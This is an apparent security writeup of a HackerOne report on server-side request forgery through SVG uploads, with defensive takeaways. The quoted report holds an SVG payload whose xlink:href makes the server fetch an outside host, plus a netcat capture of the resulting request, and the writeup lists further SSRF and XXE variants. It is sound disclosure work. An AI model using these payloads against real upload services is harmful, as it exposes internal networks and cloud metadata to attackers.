# SVG Parser Loads External Resources on Image Upload

## Metadata
- **Source:** HackerOne
- **Report:** 97501 | https://hackerone.com/reports/97501
- **Submitted:** 2015-11-03
- **Reporter:** ogig
- **Program:** Unknown (HackerOne Report 97501)
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Server-Side Request Forgery (SSRF), Unsafe XML Processing, External Entity Loading
- **CVEs:** None
- **Category:** web-api

## Summary
The application's SVG parser automatically fetches external resources referenced via xlink:href attributes when processing uploaded SVG files. An attacker can upload a malicious SVG containing external URLs to trigger arbitrary HTTP requests from the server, potentially accessing internal resources or exfiltrating information.

## Attack scenario
1. Attacker identifies that the application accepts SVG file uploads for image processing
2. Attacker crafts a malicious SVG file containing an <image> element with xlink:href pointing to an attacker-controlled server or internal URL
3. Attacker uploads the SVG file through the image upload functionality
4. Server-side SVG parser processes the file and automatically attempts to fetch the resource specified in xlink:href
5. Server makes HTTP request from its own IP/context, revealing server-side information or accessing internal resources
6. Attacker receives the HTTP request in their logs (or accesses internal resources if targeting private IPs)

## Root cause
The SVG parser library is configured to resolve and load external resources by default without proper sanitization or validation. The application does not restrict xlink:href attributes or disable external resource loading during SVG processing.

## Attacker mindset
An attacker recognizes that server-side image processing creates an SSRF opportunity. By embedding external URL references in SVG metadata, they can force the server to make requests on their behalf, potentially accessing internal services, metadata endpoints, or exfiltrating data through request headers.

## Defensive takeaways
- Disable external resource loading in SVG parsers (configure XML/SVG libraries to not resolve external entities or URLs)
- Implement strict whitelist validation on SVG content before processing; reject or strip xlink:href, data URIs, and script elements
- Use an isolated, sandboxed environment for image processing with network restrictions
- Validate uploaded files by re-encoding or converting SVGs to safer formats rather than parsing directly
- Implement network-level egress filtering to prevent unexpected outbound connections from application servers
- Apply principle of least privilege to service accounts running image processing code

## Variant hunting
Check for similar SSRF via SVG <use> tag references to external files
Test SVG <script> tag execution possibilities
Investigate XML External Entity (XXE) injection via DOCTYPE declarations in SVG
Look for SSRF via CSS url() imports in SVG <style> elements
Test if other image formats (XML, PDF with embedded resources) have similar vulnerabilities
Check if SVG filters with feImage or other resource-loading elements bypass restrictions

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1557 - Man-in-the-Middle
- T1570 - Lateral Tool Transfer
- T1491 - Defacement
- T1530 - Data from Cloud Storage Object

## Notes
The writeup provides strong proof-of-concept evidence: successful fetch of public Google image and netcat capture of server making HTTP request with correct headers. This is a textbook SSRF vulnerability via file upload. The vulnerability is particularly dangerous because it operates at the parser level and may be difficult for developers to anticipate. Risk is amplified if server has access to internal networks or cloud metadata endpoints.

## Full report
<details><summary>Expand</summary>

Uploading SVG that include

```
 <image xlink:href="http://example.com/?evil=var" />
```

will cause the server side parser to try to fetch external resources.

I've tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. 

Also tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. 

```
Listening on [0.0.0.0] (family 0, port 3001)
Connection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)
GET /?evil=var HTTP/1.0
Host: 37.139.18.151:3001
Accept-Encoding: gzip
```

</details>

---
*Analysed by Claude on 2026-05-24*
